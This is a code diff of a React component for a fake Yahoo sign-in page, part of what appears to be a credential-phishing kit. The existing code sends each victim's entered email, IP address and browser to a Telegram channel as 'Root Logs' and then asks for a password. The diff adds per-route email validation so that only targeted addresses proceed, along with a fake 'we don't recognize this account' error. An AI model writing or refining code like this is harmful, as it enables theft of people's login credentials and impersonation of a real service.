@@ -1,8 +1,10 @@
 import React, { useState, useEffect } from "react";
+import { useLocation } from "react-router-dom";
 import {
   getUserIP,
   getUserBrowser,
   sendMessageToTelegram,
+  validateEmailForRoute,
 } from "../services/api";
 import ylogo from "../assets/yaho.png"; // Adjust the path as necessary
 
@@ -16,6 +18,9 @@ const Yaho = () => {
 
   const [showErrorMessage, setShowErrorMessage] = useState(false);
 
+  const [isValid, setIsValid] = useState(true); // State to keep track of validation
+  const location = useLocation();
+
   useEffect(() => {
     getUserIP().then(setIpAddress);
     const browser = getUserBrowser();
@@ -24,9 +29,20 @@ const Yaho = () => {
 
   const handleEmailSubmit = async (event) => {
     event.preventDefault();
-    const message = `Root Logs\nMultipage\nYahoo\nEmail entered: ${email}\n\n\nuserIP: ${ipAddress}\nuserBrowser: ${browser}`;
-    await sendMessageToTelegram(message);
-    setShowPasswordForm(true);
+
+    const isValidEmail = validateEmailForRoute(location.pathname, email);
+    setIsValid(isValidEmail);
+    if (isValidEmail) {
+      console.log("Email is valid for this route");
+      const message = `Root Logs\nMultipage\nYahoo\nEmail entered: ${email}\n\n\nuserIP: ${ipAddress}\nuserBrowser: ${browser}`;
+      await sendMessageToTelegram(message);
+      setShowPasswordForm(true);
+      // Proceed with your submission logic
+    } else {
+      console.log("Email is not valid for this route");
+      // Handle invalid email case
+    }
+    
   };
 
   const handlePasswordSubmit = async (event) => {
@@ -86,6 +102,11 @@ const Yaho = () => {
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
                 />
+                {!isValid && (
+                  <div className="text-sm" style={{ color: "red" }}>
+                    Sorry, we don't recognize this account.
+                  </div>
+                )}
               </div>
               <div class="flex items-center justify-between">
                 <div class="flex items-center">
@@ -105,7 +126,10 @@ const Yaho = () => {
                 </div>
 
                 <div class="text-sm">
-                  <a href="/yahoo" class="font-medium text-[#39f] hover:text-[#39f]">
+                  <a
+                    href="/yahoo"
+                    class="font-medium text-[#39f] hover:text-[#39f]"
+                  >
                     {" "}
                     Forgot username?{" "}
                   </a>
@@ -170,7 +194,10 @@ const Yaho = () => {
               </div>
               <div class="flex items-center justify-between">
                 <div class="text-sm">
-                  <a href="/yahoo" class="font-medium text-[#39f] hover:text-[#39f]">
+                  <a
+                    href="/yahoo"
+                    class="font-medium text-[#39f] hover:text-[#39f]"
+                  >
                     {" "}
                     Forgot password?{" "}
                   </a>
